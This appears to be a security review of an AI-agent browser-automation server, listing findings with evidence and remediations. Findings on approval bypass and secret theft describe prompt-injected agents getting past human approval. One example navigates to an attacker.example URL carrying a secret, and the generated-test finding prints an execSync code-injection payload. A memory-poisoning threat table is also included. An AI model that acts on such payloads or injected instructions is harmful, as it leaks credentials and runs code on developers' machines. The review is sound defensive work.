# 11 — Security Review

Severity: Critical / High / Medium / Low. Confidence: **Confirmed** (reproduced by probe/test), **High** (code-evident, deterministic), **Medium** (plausible, needs specific conditions).

## 1. Baseline (what is already strong)

Context-level domain policy (routes for every request, redirect-hop cancellation, committed-URL check, WebSocket routing, service workers blocked) — `session-manager.ts:384-482`; metadata/IPv4-mapped IPv6 normalization — `domain-policy.ts`; denied launch flags and `tls.verify` literal true — `permission-manager.ts:19-30`, `schema.ts:47-53`; browser environment allowlist (no tokens/secrets in renderer env) — `browser-launcher.ts:70`; token removed from `process.env` after reading — `streamable-http.ts:48`; constant-time token checks; dashboard Host/Origin/CSRF/cookie/CSP/realpath boundary — `ui/server.ts`; no eval/shell tools; elicitation-based approvals with no model self-approval path; redaction of headers/URLs/JWT/cards; encrypted storage state. Tests cover most of this (`security.test.ts`, `domain-policy.test.ts`, `registry-security.test.ts`, `dashboard.test.ts`).

## 2. Findings

### S-01 Destructive-action approval bypass via keyboard/submit paths — **High / Confirmed** (D2)

- Evidence: approval only in `click` (`action-executor.ts:465-471`). `fill(submit)` presses Enter (`:509`), `type(submit)` (`:573`), `press` (`:580-595`), `selectOption`, `setChecked`, `drag`, and workflow steps reuse these. Probe P3: with `destructive: deny`, `click` → `PERMISSION_DENIED`; `press Enter` on the same ref deleted the account.
- Impact: prompt-injected agent performs gated actions without the human.
- Remediation: move the policy gate into the action pipeline: for every mutating action classify the _effective_ target — the resolved element, the focused element for page-level keys, the form's submit button for Enter in a form field — and apply destructive/high-impact rules. Treat Enter/Space on buttons as clicks.
- Regression test: P3 inverted for `press`, `fill submit`, `type submit`, workflow `press` step.

### S-02 Page-controlled snapshot engine (`window.__tgSnap` takeover) — **High / Confirmed** (D5)

- Evidence: install guard `if (w.__tgSnap && w.__tgSnap.version === 1) return;` (`injected.ts:61`); engine object writable/configurable in main world (`:651-668`); `resolve()` trusts `__tgSnap.get/describe` (`element-reference.ts:63-76`); `resolveTarget` uses page `describe` for locators (`target.ts:105-112`). Probe P10: page reported "Harmless help"; click with destructive=deny triggered "Delete everything".
- Impact: approval classification, sensitive-field masking (`isSensitive` runs in page), and ref→element mapping are attacker-controlled. Docs (`docs/SECURITY.md` limitations) understate this.
- Remediation: install via `context.addInitScript` before page scripts, closure state, non-configurable property, captured built-ins; derive approval-relevant names via Playwright isolated-world reads and compare; perform sensitive masking decisions Node-side as a second check (`isSensitiveField` already exists, `action-executor.ts:294-301`).
- Regression test: P10 must return `TARGET_CHANGED`/approval prompt; masking test with a page that redefines `HTMLInputElement.prototype.type` getter.

### S-03 Code injection in generated Playwright tests — **High / Confirmed** (D3)

- Evidence: `tpl()` escapes backslashes/backticks and rewrites only `${name}`/`${secret.NAME}`; any other `${…}` survives into a template literal (`test-generator.ts:7-16`). Probe P7 produced ``.fill(`${require('child_process').execSync('id')}`)``. Values originate from recorded actions (model-typed, possibly prompt-injected) or imported/inline definitions. `test_generate path=` writes into cwd (default roots) (`workflow-tools.ts:248-258`, `load-config.ts:148-149`).
- Impact: code execution on the developer's machine when the spec is run (`npx playwright test`), CI compromise.
- Remediation: generate string literals with `JSON.stringify` and build interpolations from a parsed token list (`[{lit},{var},{secret}]`), never by regex on raw text; validate `ex.variable`/session names as identifiers (already regex-validated for `extract.variable`, `id`; also `s.session` is interpolated into `outputPath('${s.session}.json')` — validated by `SAFE_NAME`, keep that). Add a generated-code test that parses the output with the TypeScript compiler API and asserts no template expressions other than `vars.X`/`secret('X')`.
- Regression test: payloads `${process.exit()}`, `` ` ``, `\r`, ` `, `'); evil(); ('`.

### S-04 Metadata / private-address bypass via DNS when `allowPrivateNetwork=true` or allowlisted hosts — **High / Confirmed** (D4)

- Evidence: `checkStatic` returns `allowed` without `needsDns` when the host is explicitly allowlisted or `allowPrivateNetwork` is true (`domain-policy.ts:165`); `check()` skips resolution. Probe P5: hostname resolving to 169.254.169.254 allowed in both configurations. `allowedDomains: ["*"]` behaves the same.
- Impact: SSRF to cloud metadata in exactly the enterprise setups that enable private networks; contradicts "always blocked" (docs/SECURITY.md, THREAT_MODEL T1).
- Remediation: always resolve non-IP hosts and apply the **metadata** rule unconditionally; apply private/loopback rules unless allowed; keep the cache. Consider CDP `Fetch`/`Network` remote IP check on Chromium for post-connection verification.
- Regression test: P5 matrix (default, `allowPrivateNetwork`, wildcard allowlist, exact allowlist) → metadata always denied.

### S-05 Secret exfiltration through model-supplied workflows — **High / High** (D14)

- Evidence: `interpolate()` resolves `${secret.NAME}` from any `TG_SECRET_*` env var in any step input (`workflow-engine.ts:549-559`); `workflow_execute` accepts inline `definition` (`workflow-tools.ts:22`, `:107-135`); default policy allows all public hosts.
- Impact: a prompt-injected agent can run `navigate https://attacker.example/?k=${secret.ERP_PASSWORD}` or fill it into an attacker form. Masking only affects messages.
- Remediation: secrets declare allowed origins (config-owned allowlist `workflows.secrets.<NAME>.origins`); interpolation allowed only into `fill/type` values whose resolved page origin matches, never into URLs, selectors, assertions or extract patterns; inline definitions cannot reference secrets unless `workflows.allowInlineSecrets=true`.
- Regression test: inline workflow with secret in navigate URL → `PERMISSION_DENIED`; secret fill on non-allowed origin → denied; allowed origin → works and value masked everywhere.

### S-06 Non-cancelling timeouts marked retry-safe — **High / High** (D12, reliability with security impact)

- Evidence: `mcp-server.ts:36-49` (`retryable: true`), `workflow-engine.ts:603-620`.
- Impact: duplicate submissions/approvals/payments when the agent follows "Retry safe: yes".
- Remediation: doc 04 §6. Test: slow fixture endpoint behind a submit; tool timeout; assert single server-side submission and `INDETERMINATE`.

### S-07 Sensitive values leaked by assertions — **Medium / Confirmed** (D7)

- Evidence: `compare()` returns raw `actual` (`assertion-engine.ts:70-86`, `:166`); `inputValue` redacts (`action-executor.ts:880-889`) but assertions don't. Workflow step messages for assertions bypass `maskSecrets` (`workflow-engine.ts:442-450`) and are persisted in run records. Probe P9: "got hunter2-SECRET".
- Remediation: Node-side `isSensitiveField(desc)` → redact `actual`/`expected`; mask known secret values in all run-record strings.

### S-08 Arbitrary file overwrite inside cwd via `path` parameters — **Medium / High** (D23)

- Evidence: default `allowedRoots = [cwd, dataDir]` (`load-config.ts:148-149`); `browser_screenshot path` (minimal profile), `browser_trace_stop path`, `test_generate path`, `test_report path` write any extension anywhere under cwd. The cloud config already fixed this (docs/SECURITY.md S4) but local default did not. Combined with S-03 this is code execution.
- Remediation: separate read roots (uploads) from write roots; default write root = `dataDir/artifacts`; require extension allowlist per tool (`.png/.jpg`, `.zip`, `.spec.ts` only under a configured tests dir, `.md/.xml/.json`); refuse overwriting existing files unless `overwrite: true` and approval.

### S-09 `allowLocalhost` applies to sub-resources from any origin — **Medium / Medium** (D28)

- Evidence: policy is origin-agnostic (`domain-policy.ts:150-155`); default `allowLocalhost: true`. A public page loaded by the agent can call `http://127.0.0.1:<port>/…` services (dev servers, local admin UIs). Chrome Private Network Access may block some cases, not all.
- Remediation: allow loopback sub-requests only when the initiating document is itself loopback, or when the host:port is listed in `localhostAllowlist`; keep top-level tool navigation behaviour.

### S-10 Approval scope for other high-impact operations — **Medium / High**

- `session_restore`, `browser_tab_create url`, `workflow_execute` inline definitions, `test_generate path`, `browser_trace_start` (captures DOM snapshots incl. form values) have `risk` ≤ interact. Recommend `risk: 'high'` + approval for `workflow_execute` with inline definitions referencing secrets, `test_generate path`, `browser_trace_start`.

### S-11 Screenshots, videos, traces and failure screenshots are unmasked — **Medium / High** (D22)

- Evidence: `screenshot()` passes no `mask` (`action-executor.ts:799-812`); `diagnoseFailure` (`workflow-engine.ts:495`); traces with `snapshots: true` (`:1078`); videos. Dashboard serves them to the operator.
- Remediation: Playwright `mask` locators for password/sensitive fields (computed Node-side), `screenshots.maskSensitive=true` default; document that traces/videos contain everything; default trace `snapshots:false` unless explicitly requested.

### S-12 Audit attribution inaccurate — **Low / High** (D20)

- `mcp-server.ts:136-155` records the _active_ session and config project, not the session in `args.session`. Fix by resolving the target session in the pipeline and returning it to the audit hook.

### S-13 HTTP transport is single-principal — **Low (documentation) / High**

- One bearer token for all clients; per-client harness isolation but shared `dataDir`/saved sessions/workflows (`streamable-http.ts:136`). Eviction/reaping can close a browser during a long in-flight call because `lastSeen` is only updated at request start (`:78-87`, `:120`, `:124-135`) — **Medium / High** (D17). Document single-tenant model; update `lastSeen` while requests are in flight; never evict sessions with in-flight requests or running workflows.

### S-14 Saved-session key co-located with data — **Low / High**

- `keys/session.key` sits in `dataDir` (`session-store.ts:54-61`). Known roadmap item (OS keychain). Keep; prioritize Windows DPAPI/macOS Keychain behind an interface.

### S-15 Custom combobox selects first substring match — **Medium / High** (D18)

- Business-integrity risk (wrong option silently chosen). Fix in doc 09.

### S-16 ReDoS from model-supplied regexes — **Low / Medium**

- `assert.matches`, `extract.pattern`, `wait url=/…/` (`action-executor.ts:405-411`) run in the Node event loop. Cap pattern length, run with a time budget (or use `RE2`-like safe subset), or evaluate in a worker.

## 3. Memory-specific threats (V2)

| Threat                                                           | Control                                                                                                                                                              |
| ---------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Memory poisoning (hostile page labels/elements)                  | memory only from complete snapshots; verified only via `VERIFIED` outcomes; element caps; `memory_events` audit; operator purge per scope                            |
| Malicious website-generated labels / persistent prompt injection | store ≤ 200 chars, strip control/zero-width chars, render as JSON-quoted data, never inject into instructions/tool descriptions; summaries list structure, not prose |
| Cross-project / cross-user / cross-tenant leakage                | scope key (project, origin, environment, auth_context); repository methods require a scope id; HTTP/Studio callers get a scope from config, not from model args      |
| Sensitive data in fingerprints                                   | no values; digit/id/email normalization; drop high-entropy tokens; hash where equality is enough                                                                     |
| Untrusted locator candidates                                     | candidates are proposals; resolution goes through the live resolver + guard + policy                                                                                 |
| Unauthorized memory modification                                 | no MCP tool writes memory directly; operator actions only via dashboard (token/CSRF) or CLI                                                                          |
| Malicious imported workflows                                     | validation, secret-origin allowlist, generator hardening (S-03), `requires.features` check                                                                           |
| Replay of previously approved high-risk actions                  | approvals are never cached in memory or workflows; each execution re-evaluates policy                                                                                |

## 4. Corporate network and TLS

Keep: system/manual proxy, env credentials, `NO_PROXY`, CA status, refusal of `--ignore-certificate-errors` and `tls.verify:false`. Do not add traffic obfuscation, firewall bypass or certificate-pinning overrides. The CA file is currently only _reported_ (`certificate-manager.ts`); for Chromium the OS store is used — document that corporate CAs must be installed in the OS trust store (or `NODE_EXTRA_CA_CERTS` for Node-side diagnostics).

## 5. Browser sandbox and Cloudflare

`chromiumSandbox` defaults to `false` locally (Playwright default) and `true` in the cloud config. Recommend default `true` on macOS/Windows and on Linux when user namespaces are available (detect in `doctor`), with an explicit opt-out. Cloudflare: single shared container (`getContainer(env.TG_BROWSER, 'main')`), ephemeral state, one token — appropriate only for single-tenant evaluation; the Docker build is currently broken (D11), so the deployment is unverified.
